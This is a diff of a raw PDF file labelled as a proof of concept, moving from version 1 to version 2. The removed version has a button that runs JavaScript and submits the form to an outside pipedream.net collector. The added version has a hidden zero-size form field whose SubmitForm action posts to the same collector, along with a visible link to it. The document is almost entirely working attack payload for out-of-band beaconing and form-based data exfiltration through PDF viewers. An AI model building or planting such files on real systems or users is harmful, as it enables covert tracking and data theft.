@@ -1,12 +1,12 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [11 0 R] >> >>
+<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [10 0 R] >> >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R 11 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [11 0 R] >>
 endobj
 4 0 obj
 << /Length 100 >>
@@ -14,8 +14,8 @@ stream
 BT
 /F1 14 Tf
 100 700 Td
-(PoC v1: Click link or button) Tj
-100 650 Td[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v1=1) Tj
+(PoC v2: Click link to send) Tj
+100 650 Td[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v2=1) Tj
 ET
 endstream
 endobj
@@ -29,10 +29,10 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 10 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 1 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v1=1) >> >>
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (HiddenField) /V () /Rect [0 0 0 0] /A << /S /SubmitForm /F[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v2_hidden=1) /Flags 4 >> >>
 endobj
 11 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (XSSButton) /Rect [100 600 300 630] /BS << /W 2 /S /S >> /H /I /A << /S /JavaScript /JS (app.alert('PoC v1: Button XSS!', 3); this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v1_js=1');) >> /AP << /N << /Type /XObject /Subtype /Form /BBox [0 0 200 30] /Resources << /Font << /F1 6 0 R >> >> /Length 60 >> stream BT /F1 14 Tf 10 15 Td (Test XSS Button) Tj ET endstream >> >> >>
+<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 1 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v2=1) >> >>
 endobj
 xref
 0 12
